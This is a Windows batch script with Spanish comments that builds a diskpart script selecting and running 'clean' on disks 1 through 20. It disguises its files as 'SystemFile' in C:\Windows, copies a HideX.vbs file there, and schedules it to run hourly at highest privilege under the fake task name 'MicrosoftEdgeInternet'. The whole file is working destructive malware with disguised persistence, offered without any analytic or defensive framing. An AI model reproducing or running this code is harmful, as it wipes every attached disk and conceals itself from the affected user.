@echo off

::preparando archivos de la tarea
echo select disk 1 > C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt
::echo timeout /t 1 /nobreak > NUL >> C:\Windows\SystemFile.txt

echo select disk 2 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 3 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 4 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 5 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 6 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 7 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 8 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 9 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 10 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 11 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 12 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 13 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 14 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 15 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 16 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 17 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 18 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 19 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo select disk 20 >> C:\Windows\SystemFile.txt
echo clean >> C:\Windows\SystemFile.txt
echo. >> C:\Windows\SystemFile.txt

echo diskpart /s C:\Windows\SystemFile.txt > C:\Windows\SystemFile2.bat

xcopy "%~dp0HideX.vbs" "C:\Windows\" /Y

::creando la tarea
schtasks /create /tn "MicrosoftEdgeInternet" /tr "C:\Windows\HideX.vbs" /sc Minute /mo 60 /f /RL HIGHEST 


